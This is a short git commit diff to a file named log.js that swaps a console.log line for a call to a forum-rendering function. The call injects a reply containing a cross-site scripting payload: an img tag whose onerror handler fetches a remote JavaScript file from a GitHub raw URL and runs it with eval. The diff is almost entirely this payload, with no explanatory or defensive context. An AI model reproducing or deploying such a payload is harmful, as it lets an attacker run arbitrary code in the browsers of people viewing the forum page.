f85d054a8021995646e593018c6487fe9954216c
404usernotfounddd-sketch <404usernotfounddd@gmail.com>
2025-10-26 18:19:58 -0500

    Update log.js

--- log.js
+++ log.js
@@ -1,1 +1,6 @@
-console.log(1);
+renderForoParticipaciones([
+  {
+    "urlFoto": "",
+    "respuesta": "<img src='x' onerror=\" fetch('https://raw.githubusercontent.com/404usernotfounddd-sketch/test/main/log.js').then(r=>r.text()).then(eval); \">",
+  }
+])
